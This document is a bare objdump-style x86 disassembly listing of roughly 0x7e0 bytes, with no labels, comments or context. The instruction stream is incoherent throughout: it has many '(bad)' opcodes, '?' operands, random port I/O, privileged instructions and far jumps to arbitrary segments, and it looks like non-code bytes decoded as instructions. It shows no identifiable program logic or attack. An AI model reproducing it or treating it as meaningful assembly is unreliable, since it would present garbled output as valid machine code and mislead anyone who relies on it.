  41ffbf:	mov    WORD PTR [edx+0x3c],?
  41ffc2:	ss je  0x41fff7
  41ffc5:	add    BYTE PTR [ebx],al
  41ffc7:	ds scas al,BYTE PTR es:[edi]
  41ffc9:	add    ch,BYTE PTR [edx]
  41ffcb:	(bad)  
  41ffcc:	arpl   WORD PTR ds:0xde7f0f47,cx
  41ffd2:	mov    al,ds:0x93f06436
  41ffd7:	inc    eax
  41ffd8:	pop    eax
  41ffd9:	and    al,BYTE PTR [edi-0x5c]
  41ffdc:	dec    edi
  41ffdd:	fidivr WORD PTR [ecx]
  41ffdf:	push   cs
  41ffe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffe1:	stos   DWORD PTR es:[edi],eax
  41ffe2:	aad    0x7a
  41ffe4:	mov    BYTE PTR gs:[edx+edx*8],0x84
  41ffe9:	mov    al,0x85
  41ffeb:	adc    al,dl
  41ffed:	jp     0x41ffab
  41ffef:	mov    ds:0x8195c83a,al
  41fff4:	fild   WORD PTR [edx+0x5ff30acd]
  41fffa:	adc    DWORD PTR [edx],0xf388e7ca
  420000:	call   ecx
  420002:	stc    
  420003:	mov    ah,0x48
  420005:	ret    0xda7a
  420008:	pop    ss
  420009:	pop    ebx
  42000a:	js     0x420083
  42000c:	lods   eax,DWORD PTR ds:[esi]
  42000d:	cmp    al,0xdc
  42000f:	fs dec ebx
  420011:	add    ch,0x9
  420014:	cmp    eax,0xa905613b
  420019:	loope  0x420061
  42001b:	mov    ss,edi
  42001d:	push   cs
  42001e:	sub    eax,0x87b9119c
  420023:	cmc    
  420024:	ja     0x420074
  420026:	fadd   DWORD PTR [ecx-0x50]
  420029:	xor    DWORD PTR es:[ebx+0xf],esp
  42002d:	fadd   DWORD PTR [edx-0x340f881b]
  420033:	outs   dx,DWORD PTR ds:[esi]
  420034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420035:	xor    ebp,ebp
  420037:	mov    ah,0x72
  420039:	push   esi
  42003a:	retf   
  42003b:	stos   BYTE PTR es:[edi],al
  42003c:	xchg   eax,ecx
  42003e:	test   cl,bh
  420040:	mov    bl,0x6
  420042:	retf   
  420043:	retf   0x9fda
  420046:	add    bh,BYTE PTR [edx-0x52]
  420049:	mov    esp,0x5782db
  42004e:	not    eax
  420050:	int    0x9a
  420052:	pop    ss
  420053:	inc    edx
  420054:	test   BYTE PTR [edi-0x6d],ch
  420057:	mov    bl,0x11
  420059:	fadd   QWORD PTR [edi-0x165c2d93]
  42005f:	nop
  420060:	and    DWORD PTR ds:0x823d9631,edx
  420066:	dec    ebx
  420067:	or     BYTE PTR [eax+0x1f],dh
  42006a:	in     eax,0xdf
  42006c:	(bad)  
  42006d:	mov    dl,0x42
  42006f:	cwde   
  420070:	(bad)  
  420071:	in     eax,dx
  420072:	scas   al,BYTE PTR es:[edi]
  420073:	push   edx
  420074:	lahf   
  420075:	call   0x15b3d36
  42007a:	daa    
  42007b:	cmp    DWORD PTR [edx],esi
  42007d:	jo     0x4200b8
  42007f:	ret    
  420080:	imul   ebp,DWORD PTR [ebx+ebx*8+0x69],0xffffffc6
  420085:	mov    eax,ds:0x66b43c77
  42008a:	lds    edi,FWORD PTR [ecx-0x12]
  42008d:	pop    es
  42008e:	mov    WORD PTR [esi],?
  420090:	mov    edi,0xdc2bb56a
  420095:	(bad)  
  420096:	mov    ?,WORD PTR [ecx+0x73b68aad]
  42009c:	jl     0x4200b7
  42009e:	push   eax
  42009f:	xchg   ebp,eax
  4200a0:	mov    ch,0x7c
  4200a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200a3:	iret   
  4200a4:	add    ch,dl
  4200a6:	jae    0x420052
  4200a8:	or     eax,DWORD PTR [edx+0x5934c73e]
  4200ae:	fsub   QWORD PTR [eax]
  4200b0:	pop    eax
  4200b1:	adc    BYTE PTR [ebp+ecx*4+0x3be4011d],bh
  4200b8:	jmp    0x4200b8
  4200ba:	gs mov esi,0x8f48aa60
  4200c0:	call   0x48d73bfb
  4200c5:	mov    ?,WORD PTR ds:0x4579d803
  4200cb:	jecxz  0x42005b
  4200cd:	sbb    edi,ecx
  4200cf:	sub    eax,0xed83af26
  4200d4:	cmp    DWORD PTR [edi+0x25],edi
  4200d7:	pop    edx
  4200d8:	fcomp  DWORD PTR [edi+0x25]
  4200db:	(bad)  [eax]
  4200dd:	js     0x4200d6
  4200df:	arpl   WORD PTR ds:0x369813fe,si
  4200e5:	das    
  4200e6:	xchg   ebp,eax
  4200e7:	scas   al,BYTE PTR es:[edi]
  4200e8:	sbb    ch,bl
  4200ea:	scas   eax,DWORD PTR es:[edi]
  4200eb:	and    al,BYTE PTR [eax+0x31]
  4200ee:	outs   dx,BYTE PTR ds:[esi]
  4200ef:	jno    0x420150
  4200f1:	pop    ds
  4200f2:	mov    ah,0xa3
  4200f4:	or     al,BYTE PTR gs:[ecx+eiz*1+0x79]
  4200f9:	xchg   ebp,eax
  4200fa:	ds pop eax
  4200fc:	(bad)  
  4200fe:	add    eax,0x2c3602a7
  420103:	xor    esp,DWORD PTR [edx]
  420105:	jecxz  0x420173
  420107:	repnz sbb dh,BYTE PTR [ecx-0x6]
  42010b:	jg     0x4200bc
  42010d:	jp     0x420146
  42010f:	and    bh,bh
  420111:	mov    edi,0x25191126
  420116:	inc    edx
  420117:	std    
  420118:	adc    al,0x9b
  42011a:	lock or ecx,ebp
  42011d:	add    BYTE PTR [edi-0x36],dh
  420120:	and    BYTE PTR [ecx-0x2edc81cd],cl
  420126:	addr16 mov ebp,0xdca40618
  42012c:	or     eax,0xd721258e
  420131:	retf   
  420132:	das    
  420133:	ins    DWORD PTR es:[edi],dx
  420134:	jmp    DWORD PTR [esi+0x4f567c59]
  42013a:	or     eax,0x84e37789
  42013f:	push   edx
  420140:	sub    ebp,DWORD PTR [eax-0x3ba61514]
  420146:	or     BYTE PTR [eax],ah
  420148:	adc    ch,0x8a
  42014b:	popa   
  42014c:	fisub  DWORD PTR [esi]
  42014e:	std    
  42014f:	ins    DWORD PTR es:[edi],dx
  420150:	in     eax,dx
  420151:	xor    dh,BYTE PTR [esi+0x5e9fbe2a]
  420157:	cmp    dh,BYTE PTR [edx+ecx*2+0x1]
  42015b:	push   ds
  42015c:	leave  
  42015d:	pop    edx
  42015e:	int3   
  42015f:	scas   al,BYTE PTR es:[edi]
  420160:	jne    0x4201ca
  420162:	enter  0xfe4d,0x41
  420166:	lea    ebp,[ecx-0x5ba377f2]
  42016c:	sub    DWORD PTR [edx-0x32a477e0],ebp
  420172:	scas   al,BYTE PTR es:[edi]
  420173:	in     eax,dx
  420174:	neg    DWORD PTR [edx-0x43f0c5f3]
  42017a:	leave  
  42017b:	fs add ebp,ebp
  42017e:	mov    edx,0xb5d6e2b
  420183:	mov    ds:0x1150277e,al
  420188:	add    BYTE PTR [eax],al
  42018a:	pop    ecx
  42018b:	push   edi
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx-0x41],esi
  420197:	aas    
  420198:	pop    esp
  420199:	mov    ah,0xe2
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	xchg   BYTE PTR [esi],al
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	(bad)  
  4201a3:	test   al,0xfd
  4201a5:	popf   
  4201a6:	push   ebp
  4201a7:	pop    edx
  4201a8:	lahf   
  4201a9:	mov    bl,0xde
  4201ab:	inc    edi
  4201ac:	sbb    esp,esi
  4201ae:	in     al,dx
  4201af:	jg     0x420180
  4201b1:	bound  esi,QWORD PTR [edx]
  4201b3:	idiv   BYTE PTR [ebx-0x28]
  4201b6:	push   ecx
  4201b7:	dec    edx
  4201b8:	fs fucom st(3)
  4201bb:	adc    eax,0x2c6870c1
  4201c0:	into   
  4201c1:	mov    ds:0xe646b515,al
  4201c6:	out    dx,al
  4201c7:	stos   BYTE PTR es:[edi],al
  4201c8:	xchg   DWORD PTR [ecx+0x1d126642],edx
  4201ce:	sbb    al,0xf7
  4201d0:	or     al,0x8e
  4201d2:	pop    esp
  4201d3:	jmp    0xfe53ca94
  4201d8:	cmp    al,0x8f
  4201da:	push   0x5e
  4201dc:	popa   
  4201dd:	pop    edi
  4201de:	and    BYTE PTR [ecx],0x1a
  4201e1:	fisttp QWORD PTR [esi-0x1eb2a65e]
  4201e7:	push   0xb2027cc6
  4201ec:	cmp    eax,0x8df855fd
  4201f1:	test   eax,0x7e3cf1cd
  4201f6:	arpl   WORD PTR [ecx-0x2d],dx
  4201f9:	mov    ah,0x86
  4201fb:	add    BYTE PTR [eax],ch
  4201fd:	push   es
  4201fe:	icebp  
  4201ff:	adc    al,BYTE PTR [eax]
  420201:	imul   ebp,ecx,0x21
  420204:	cmp    eax,0xf2f0ec93
  420209:	scas   eax,DWORD PTR es:[edi]
  42020a:	les    esp,FWORD PTR [eax-0x79]
  42020d:	dec    edi
  42020e:	lea    ecx,[ebx]
  420210:	fimul  WORD PTR [edx-0x652018a6]
  420216:	call   0x73fde372
  42021b:	sar    DWORD PTR [edx+0x56],0xe
  42021f:	cdq    
  420220:	in     eax,dx
  420221:	out    dx,al
  420222:	jne    0x4201d5
  420224:	loope  0x42024e
  420226:	xchg   edx,eax
  420227:	out    0x78,eax
  420229:	addr16 sub eax,0xe89cbf10
  42022f:	push   esp
  420230:	cdq    
  420231:	push   ss
  420232:	xchg   eax,ebp
  420234:	bound  ebx,QWORD PTR [esi+0x428acce2]
  42023a:	dec    ebx
  42023b:	mov    ebp,0xa074ba32
  420240:	nop
  420241:	inc    ebx
  420242:	xor    BYTE PTR [edi-0x22],ch
  420245:	and    DWORD PTR ds:0xa3c8dc48,esp
  42024b:	dec    edi
  42024c:	xchg   cl,al
  42024e:	stc    
  42024f:	gs dec edx
  420251:	xchg   DWORD PTR [ebp-0x294a566e],ebp
  420257:	sub    DWORD PTR [edx+0x43cdca00],esp
  42025d:	jl     0x42028e
  42025f:	pop    edi
  420260:	loopne 0x420282
  420262:	stos   BYTE PTR es:[edi],al
  420263:	push   es
  420264:	lock in al,dx
  420266:	and    ebp,DWORD PTR [ebx-0x2b]
  420269:	sbb    BYTE PTR [eax+0x20],ah
  42026c:	iret   
  42026d:	add    dl,al
  42026f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420270:	pop    es
  420271:	inc    ebp
  420272:	mov    eax,0xdd988f9a
  420277:	test   al,0x56
  420279:	stos   BYTE PTR es:[edi],al
  42027a:	loop   0x4202f1
  42027c:	loop   0x4202ce
  42027e:	mov    ds:0x1b70d43,eax
  420283:	fist   WORD PTR [edx+0x41]
  420286:	adc    BYTE PTR [edx+ecx*1-0x1f],dh
  42028a:	fidivr DWORD PTR [ecx+edx*1-0x7e3c2fd1]
  420291:	adc    DWORD PTR [eax-0x6a],edi
  420294:	and    al,ah
  420296:	sub    ecx,DWORD PTR [ebp-0xa]
  420299:	or     BYTE PTR [edi-0x7bc74dc2],ch
  42029f:	pop    ecx
  4202a0:	push   esp
  4202a1:	lea    esp,[ebx-0x59]
  4202a4:	idiv   DWORD PTR [edi]
  4202a6:	call   0x57c8:0xef8bca3e
  4202ad:	adc    ebp,DWORD PTR [ebx+0x523013cd]
  4202b3:	loope  0x4202c4
  4202b5:	dec    edi
  4202b6:	xor    eax,0xf657d1c4
  4202bb:	xchg   edi,eax
  4202bc:	mov    ecx,0x99f06cf8
  4202c1:	add    esp,edi
  4202c3:	fwait
  4202c4:	out    dx,eax
  4202c5:	dec    ecx
  4202c6:	xchg   edx,eax
  4202c7:	fbld   TBYTE PTR [ecx-0xe231227]
  4202cd:	xlat   BYTE PTR ds:[ebx]
  4202ce:	sbb    edx,DWORD PTR [edx]
  4202d0:	ficom  DWORD PTR [esi-0x3bdb7989]
  4202d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202d7:	adc    cl,ah
  4202d9:	fisttp DWORD PTR [ecx-0x3387a482]
  4202df:	ficom  DWORD PTR [ecx]
  4202e1:	jge    0x420276
  4202e3:	jle    0x4202f1
  4202e5:	sbb    edx,edi
  4202e7:	cwde   
  4202e8:	jbe    0x420279
  4202ea:	mov    esi,0x89ba6922
  4202ef:	int3   
  4202f0:	mov    ds:0x75e76dfe,eax
  4202f5:	lods   al,BYTE PTR ds:[esi]
  4202f6:	ja     0x42030e
  4202f8:	std    
  4202f9:	sbb    ebx,DWORD PTR [ebp+0x70]
  4202fc:	not    DWORD PTR [ecx-0x76]
  4202ff:	sbb    eax,eax
  420301:	aam    0x37
  420303:	ror    BYTE PTR [ebp+0x0],cl
  420306:	push   cs
  420307:	cmp    BYTE PTR [ebp+0x5474f919],bh
  42030d:	mov    esi,0xf55b4f2c
  420312:	add    BYTE PTR [edx-0x43],ch
  420315:	sar    DWORD PTR [esi],1
  420317:	(bad)  
  420318:	adc    dh,ch
  42031a:	lea    ebx,[ebx-0x80]
  42031d:	call   esi
  42031f:	inc    edi
  420320:	test   BYTE PTR [edx+0x79a8fff7],0xc6
  420327:	pop    edi
  420328:	std    
  420329:	mov    bl,0xc9
  42032b:	cmp    al,0xce
  42032d:	inc    esi
  42032e:	mov    esi,0xbebf3b10
  420333:	inc    edx
  420334:	test   ah,0x26
  420337:	mov    eax,ds:0xea9fbc1f
  42033c:	push   ecx
  42033d:	mov    ds:0x5aa3f63d,eax
  420342:	bnd ret 
  420344:	sbb    edx,ebx
  420346:	jmp    0x9d7173d1
  42034b:	mov    ch,0xdc
  42034d:	jns    0x4202fc
  42034f:	push   esi
  420350:	sub    edi,ebx
  420352:	out    dx,eax
  420353:	mov    dl,bh
  420355:	jge    0x42036e
  420357:	in     al,0xf6
  420359:	dec    ebp
  42035a:	dec    eax
  42035b:	push   cs
  42035c:	jb     0x420399
  42035e:	sahf   
  42035f:	or     DWORD PTR [edx],edi
  420361:	mov    eax,ss:0x193a19c4
  420367:	sbb    eax,0xb6cb11ef
  42036c:	pop    ebx
  42036d:	inc    BYTE PTR [ecx-0xb]
  420370:	arpl   bp,bx
  420372:	xor    BYTE PTR fs:[edx+0x67],bh
  420376:	mov    ecx,DWORD PTR [ecx-0x6e685018]
  42037c:	jecxz  0x4203b6
  42037e:	in     al,dx
  42037f:	ror    BYTE PTR [ecx+0x7304c0fd],0x9f
  420386:	mov    eax,0x7d7be0c3
  42038b:	jge    0x42033f
  42038d:	cld    
  42038e:	push   edi
  42038f:	in     al,dx
  420390:	clc    
  420391:	sub    dh,al
  420393:	pop    ss
  420394:	push   ebp
  420395:	jg     0x4203c9
  420397:	sub    eax,0xcfeda196
  42039c:	cmp    esi,DWORD PTR [edi]
  42039e:	leave  
  42039f:	fidiv  DWORD PTR [eax+esi*8+0x6f]
  4203a3:	jns    0x420417
  4203a5:	fisttp WORD PTR [ecx]
  4203a7:	sar    DWORD PTR [edx-0x1d],0x8d
  4203ab:	jge    0x420340
  4203ad:	stos   BYTE PTR es:[edi],al
  4203ae:	dec    ecx
  4203af:	test   BYTE PTR ds:0xe5af4581,0x86
  4203b6:	test   al,0xcd
  4203b8:	xor    cl,0x10
  4203bb:	fadd   st,st(6)
  4203bd:	jmp    0xd8e4:0x6d0424ac
  4203c4:	or     esp,DWORD PTR [edi+eax*8-0x57]
  4203c8:	sbb    al,0x5a
  4203ca:	mov    ch,0x1b
  4203cc:	cld    
  4203cd:	out    dx,al
  4203ce:	mov    BYTE PTR [eax-0x27],bh
  4203d1:	ss mov ebp,0x276836c
  4203d7:	loop   0x42038a
  4203d9:	adc    dh,ah
  4203db:	or     ecx,DWORD PTR [edi-0x69699ec1]
  4203e1:	scas   eax,DWORD PTR es:[edi]
  4203e2:	stc    
  4203e3:	lea    eax,[edi-0x17f1db33]
  4203e9:	mov    eax,DWORD PTR [esp+esi*1+0x3c]
  4203ed:	sbb    edi,DWORD PTR [ebx+ebx*4]
  4203f0:	loop   0x42043c
  4203f2:	scas   al,BYTE PTR es:[edi]
  4203f3:	aad    0x45
  4203f5:	hlt    
  4203f6:	mov    ds:0x6568409c,eax
  4203fb:	mov    al,0xb0
  4203fd:	fadd   DWORD PTR [esp+ebx*8]
  420400:	mov    esp,0xcfab2bae
  420405:	mov    al,ds:0xbcc79aee
  42040a:	dec    edx
  42040b:	push   esp
  42040c:	sub    DWORD PTR [eax+ebp*8+0x65],ebp
  420410:	push   eax
  420411:	stos   BYTE PTR es:[edi],al
  420412:	cmp    eax,0x96493b64
  420417:	xchg   edx,eax
  420418:	scas   al,BYTE PTR es:[edi]
  420419:	arpl   WORD PTR [edi],bp
  42041b:	sbb    esi,edx
  42041d:	js     0x42041e
  42041f:	push   0x4f7f34ae
  420424:	imul   edi,DWORD PTR [ebx+0x10],0xbf3e0d73
  42042b:	bound  edi,QWORD PTR [esp+esi*8-0x7d472a94]
  420432:	and    eax,0x3cb0505b
  420437:	and    BYTE PTR [edx-0x6b2ef2c3],dh
  42043d:	std    
  42043e:	jmp    0x992:0xb30564b7
  420445:	(bad)  
  420446:	pop    ss
  420447:	jno    0x4203d0
  420449:	cli    
  42044a:	mov    ?,WORD PTR [ebx+0x72]
  42044d:	xchg   edi,eax
  42044e:	push   0xffffffdb
  420450:	ret    0xfbf7
  420453:	retf   
  420454:	mov    eax,ds:0x66f20399
  420459:	xchg   BYTE PTR [eax-0x5194f157],ah
  42045f:	inc    ebp
  420460:	xlat   BYTE PTR ds:[ebx]
  420461:	dec    eax
  420462:	call   DWORD PTR [esi]
  420464:	and    eax,DWORD PTR [ecx]
  420466:	adc    ch,ah
  420468:	pop    ss
  420469:	out    dx,eax
  42046a:	and    DWORD PTR [ecx],ebp
  42046c:	ror    BYTE PTR [esi-0x2],0x32
  420470:	mov    edx,0x82fabff7
  420475:	push   ss
  420476:	aad    0xab
  420478:	in     al,0x17
  42047a:	out    dx,eax
  42047b:	repnz sub esp,DWORD PTR [esi]
  42047e:	test   BYTE PTR [edx],0x4c
  420481:	sub    al,BYTE PTR [ebx]
  420483:	mov    ds:0x21e3211d,al
  420488:	add    ebx,DWORD PTR [esi+0x60]
  42048b:	(bad)  
  42048c:	xchg   esi,eax
  42048d:	test   edi,esi
  42048f:	ret    0x2f32
  420492:	sti    
  420493:	mov    ecx,ebp
  420495:	rol    esi,1
  420497:	or     al,0xa5
  420499:	jmp    0x420434
  42049b:	sti    
  42049c:	sbb    al,0xeb
  42049e:	mov    al,0x64
  4204a0:	xchg   ebx,eax
  4204a1:	aas    
  4204a2:	sub    bl,ch
  4204a4:	mov    esi,esp
  4204a6:	pop    esi
  4204a7:	icebp  
  4204a8:	push   0x1f6e6b27
  4204ad:	jmp    0x92308562
  4204b2:	scas   eax,DWORD PTR es:[edi]
  4204b3:	dec    edi
  4204b4:	(bad)  
  4204b5:	(bad)  [eax+0x4]
  4204b8:	xchg   edi,eax
  4204b9:	(bad)  
  4204ba:	stc    
  4204bb:	mov    al,0x2e
  4204bd:	mov    es,WORD PTR [eax-0x4d]
  4204c0:	(bad)  
  4204c1:	jecxz  0x4204c3
  4204c3:	push   ebx
  4204c4:	ss adc edx,ebp
  4204c7:	lds    ecx,FWORD PTR [ecx+eiz*1]
  4204ca:	mov    ebx,0xb0640f31
  4204cf:	repnz cmp al,dl
  4204d2:	jmp    0xaa6b:0x2f94fef6
  4204d9:	mov    eax,0x69e1cd9e
  4204de:	inc    esp
  4204df:	fcmovnb st,st(7)
  4204e1:	imul   edx,DWORD PTR [ebx-0x5e4a9c5a],0xffffff9e
  4204e8:	dec    eax
  4204e9:	aaa    
  4204ea:	in     eax,dx
  4204eb:	mov    cl,0x96
  4204ed:	jg     0x4204e9
  4204ef:	mov    ah,0x9b
  4204f1:	pop    edi
  4204f2:	std    
  4204f3:	mov    al,ds:0xd3a1230d
  4204f8:	clc    
  4204f9:	mov    DWORD PTR [ecx+edx*2],eax
  4204fc:	adc    eax,0xd86ab378
  420501:	(bad)  
  420502:	pop    edx
  420503:	pop    edi
  420504:	aaa    
  420505:	inc    ecx
  420506:	mov    cs,WORD PTR [ebx-0x44263995]
  42050c:	pop    ecx
  42050d:	add    eax,0x5c2d140e
  420512:	mov    ch,0x17
  420514:	pusha  
  420515:	aam    0x3b
  420517:	test   eax,0xe44b3d08
  42051c:	jmp    0x420532
  42051e:	jns    0x420561
  420520:	inc    eax
  420521:	iret   
  420522:	push   edx
  420523:	rep ins DWORD PTR es:[edi],dx
  420525:	ror    eax,1
  420527:	dec    ecx
  420528:	sbb    bl,0xd4
  42052b:	inc    edx
  42052c:	cmp    dl,al
  42052e:	out    dx,eax
  42052f:	stc    
  420530:	add    DWORD PTR [eax],ebx
  420532:	sbb    bh,BYTE PTR [edx-0x5a]
  420535:	jl     0x4204ff
  420537:	push   esi
  420538:	jae    0x4204d1
  42053a:	jne    0x4204fc
  42053c:	hlt    
  42053d:	jae    0x4204f1
  42053f:	and    eax,0x2411649f
  420544:	jne    0x4205a6
  420546:	mov    cl,0xe5
  420548:	xchg   ecx,eax
  420549:	adc    al,0x21
  42054b:	sbb    ebp,ecx
  42054d:	or     eax,0x71349b8e
  420552:	cld    
  420553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420554:	inc    BYTE PTR [edi+0x11]
  420557:	adc    eax,0x20639415
  42055c:	out    dx,eax
  42055d:	xchg   BYTE PTR [eax+ebx*8],cl
  420560:	ss aas 
  420562:	inc    ebp
  420563:	das    
  420564:	or     dl,cl
  420566:	and    BYTE PTR [esp+edi*8],dl
  420569:	(bad)  
  42056a:	jnp    0x42057c
  42056c:	mov    eax,ds:0xe4a9b54c
  420571:	lds    esi,FWORD PTR [ebp+0x7b]
  420574:	test   BYTE PTR [edi+edx*1-0x68],cl
  420578:	in     eax,0x97
  42057a:	fwait
  42057b:	mov    ebx,0x1403da10
  420580:	inc    ebx
  420581:	pop    ebp
  420582:	fucom  st(2)
  420584:	push   0x3b
  420586:	stc    
  420587:	icebp  
  420588:	fdivr  DWORD PTR [eax+edi*1+0x2]
  42058c:	pop    edi
  42058d:	pop    esi
  42058e:	mul    DWORD PTR [eax-0x2e]
  420591:	out    dx,eax
  420592:	rcr    DWORD PTR [eax],1
  420594:	or     esp,DWORD PTR [esi]
  420596:	lods   eax,DWORD PTR ds:[esi]
  420597:	mov    eax,0x75b3a253
  42059c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42059e:	mov    WORD PTR [eax+0x6a69c14a],ds
  4205a4:	shr    DWORD PTR ds:0x8c9f8dcc,1
  4205aa:	xlat   BYTE PTR ds:[ebx]
  4205ab:	cmp    esp,DWORD PTR [eax-0x13]
  4205ae:	aaa    
  4205af:	out    dx,eax
  4205b0:	pop    eax
  4205b1:	add    eax,ecx
  4205b3:	adc    ch,BYTE PTR [ecx-0x46]
  4205b6:	add    al,0xa3
  4205b8:	fwait
  4205b9:	mov    al,0xb5
  4205bb:	adc    ebp,0x5e5a7a2
  4205c1:	pop    ebx
  4205c2:	push   edx
  4205c3:	fld    TBYTE PTR [esp+ebx*4+0x44c92b28]
  4205ca:	jnp    0x4205b1
  4205cc:	push   edx
  4205cd:	cld    
  4205ce:	loope  0x420593
  4205d0:	daa    
  4205d1:	rol    ah,1
  4205d3:	adc    DWORD PTR [esi-0x25],ebp
  4205d6:	dec    esi
  4205d7:	js     0x42059f
  4205d9:	lock and eax,0x4b31066b
  4205df:	add    ebx,DWORD PTR [edx+0x55ff83d7]
  4205e5:	loop   0x420631
  4205e7:	dec    ebx
  4205e8:	and    DWORD PTR [edx-0x71],ebx
  4205eb:	jmp    0x4205e0
  4205ed:	fst    DWORD PTR [esi]
  4205ef:	cmp    BYTE PTR [edi+esi*8+0x5e270964],dl
  4205f6:	push   ecx
  4205f7:	(bad)  
  4205f8:	popa   
  4205f9:	dec    eax
  4205fa:	lahf   
  4205fb:	pushf  
  4205fc:	inc    ebp
  4205fd:	cli    
  4205fe:	(bad)  
  4205ff:	or     eax,0xffe3b77c
  420604:	jne    0x42061c
  420606:	ins    BYTE PTR es:[edi],dx
  420607:	jne    0x420595
  420609:	int3   
  42060a:	loope  0x42063d
  42060c:	sar    ebp,1
  42060e:	xchg   ecx,eax
  42060f:	and    al,0x13
  420611:	ins    DWORD PTR es:[edi],dx
  420612:	pop    ss
  420613:	mov    ebx,0xe4bb717e
  420618:	inc    esp
  420619:	aas    
  42061a:	mov    esi,0x7c815ec
  42061f:	sub    BYTE PTR [eax+0x3],cl
  420622:	fstp   QWORD PTR [edx-0x59547326]
  420628:	pop    ss
  420629:	jl     0x42069b
  42062b:	or     dh,al
  42062d:	(bad)  
  42062f:	imul   ebx,DWORD PTR [ebp+0x5],0x37dd9769
  420636:	mov    bl,0x19
  420638:	call   0x1912:0xd7d80cbd
  42063f:	dec    edi
  420640:	xor    ch,ah
  420642:	xchg   ebx,eax
  420643:	add    esi,DWORD PTR [edi]
  420645:	add    edx,esp
  420647:	(bad)  
  420648:	cmc    
  420649:	call   edx
  42064b:	ficom  WORD PTR [ebp-0xbee9424]
  420651:	and    al,0x97
  420653:	(bad)  
  420654:	pushf  
  420655:	mov    ebp,0x6e5adfd5
  42065a:	or     esp,esp
  42065c:	mov    BYTE PTR [edx-0x1d],dl
  42065f:	mov    edx,0xb4642956
  420664:	jo     0x420656
  420666:	out    0x4,al
  420668:	fistp  WORD PTR [edx-0x5f]
  42066b:	and    DWORD PTR ds:[esi],edx
  42066e:	xchg   esi,eax
  42066f:	ss jl  0x4206da
  420672:	sar    BYTE PTR [ebp+0x420d8cf],cl
  420678:	imul   esi,DWORD PTR [ecx+edx*2],0x734131
  42067f:	enter  0xee21,0xf6
  420683:	daa    
  420684:	xchg   ebx,eax
  420685:	out    dx,eax
  420686:	aad    0x8a
  420688:	and    al,0x55
  42068a:	fucomi st,st(5)
  42068c:	xchg   esi,esi
  42068e:	jnp    0x420680
  420690:	repnz cwde 
  420692:	cmc    
  420693:	dec    eax
  420694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420695:	sahf   
  420696:	leave  
  420697:	es loopne 0x420701
  42069a:	mov    DWORD PTR [edx+0x2e],ecx
  42069d:	push   cs
  42069e:	mov    ebp,0xb814a7f9
  4206a3:	and    DWORD PTR [ebx-0x7252e34],ebx
  4206a9:	outs   dx,BYTE PTR ds:[esi]
  4206aa:	pop    eax
  4206ab:	cld    
  4206ac:	fisub  WORD PTR [ebp+ecx*1-0x483353b3]
  4206b3:	inc    eax
  4206b4:	addr16 mov edi,0xd54cfe34
  4206ba:	mov    bh,0x25
  4206bc:	shr    BYTE PTR [ebx-0xd135af6],0x57
  4206c3:	jecxz  0x420656
  4206c5:	sbb    al,0x60
  4206c7:	pop    es
  4206c8:	sbb    eax,DWORD PTR [eax]
  4206ca:	xor    ah,dh
  4206cc:	pop    eax
  4206cd:	sub    DWORD PTR [eax],0xffffff8e
  4206d0:	mov    edi,0x614a457d
  4206d5:	inc    ebx
  4206d6:	and    al,0xc6
  4206d8:	or     eax,0xe81a44c7
  4206dd:	and    eax,DWORD PTR [edx+eiz*4-0x252cc57]
  4206e4:	or     DWORD PTR [ebp+eax*8+0x2a],ebp
  4206e8:	inc    esp
  4206e9:	jns    0x420699
  4206eb:	jns    0x4206ab
  4206ed:	and    DWORD PTR [eax],0x3f
  4206f0:	mov    BYTE PTR [eax-0x14],ch
  4206f3:	leave  
  4206f4:	retf   0x87c7
  4206f7:	es fucomi st,st(6)
  4206fa:	fimul  DWORD PTR [eax+0xb]
  4206fd:	inc    ecx
  4206fe:	sbb    BYTE PTR [eax+0x1f],ch
  420701:	sbb    ecx,DWORD PTR [esp+esi*1-0xa]
  420705:	data16 aad 0x2
  420708:	(bad)  
  420709:	xor    DWORD PTR [esi+0x5102ed01],esp
  42070f:	aaa    
  420710:	pop    edi
  420711:	xchg   esi,eax
  420712:	jmp    DWORD PTR [edx]
  420714:	pop    edi
  420715:	dec    edx
  420716:	mov    esi,0x5f54e613
  42071b:	loop   0x4206e1
  42071d:	adc    DWORD PTR cs:0x260117d9,edi
  420724:	ret    0xeb3a
  420727:	sbb    DWORD PTR [ebp-0x1],esp
  42072a:	jbe    0x420725
  42072c:	lea    ebp,[edi+0x66]
  42072f:	imul   ebx,esi,0x3f894df9
  420735:	bound  esp,QWORD PTR [edx+edx*1-0x61]
  420739:	jge    0x4206eb
  42073b:	int3   
  42073c:	adc    ecx,DWORD PTR [edx-0x50]
  42073f:	jns    0x4207a0
  420741:	dec    ecx
  420742:	enter  0xc317,0xb2
  420746:	pop    es
  420747:	xor    al,BYTE PTR [edx+0x6a]
  42074a:	mov    dl,0x60
  42074c:	add    ecx,eax
  42074e:	retf   0x66f3
  420751:	outs   dx,BYTE PTR ds:[esi]
  420752:	rcl    dl,1
  420754:	sbb    DWORD PTR [ebx],edi
  420756:	lock repnz push ecx
  420759:	cld    
  42075a:	and    bl,BYTE PTR [eax+0x52]
  42075d:	jle    0x420776
  42075f:	add    ch,bl
  420761:	jb     0x4207ce
  420763:	stc    
  420764:	add    DWORD PTR [esp+eiz*4-0x10],ecx
  420768:	push   ebx
  420769:	hlt    
  42076a:	pop    eax
  42076b:	dec    DWORD PTR [edx-0x54]
  42076e:	sbb    eax,0x80183d3b
  420773:	stc    
  420774:	add    al,0x3d
  420776:	pop    eax
  420777:	add    eax,DWORD PTR [eax+0x2e]
  42077a:	xchg   ebp,eax
  42077b:	inc    eax
  42077c:	pop    esi
  42077d:	mov    eax,0x194e8e6e
  420782:	loop   0x4207f1
  420784:	mov    ch,0x5b
  420786:	mov    edx,0x77475a5d
  42078b:	xor    BYTE PTR [ebp+0x738fb62b],0xde
  420792:	imul   eax,DWORD PTR [ebp-0x7e04955c],0xf1e4049a
  42079c:	pop    esp
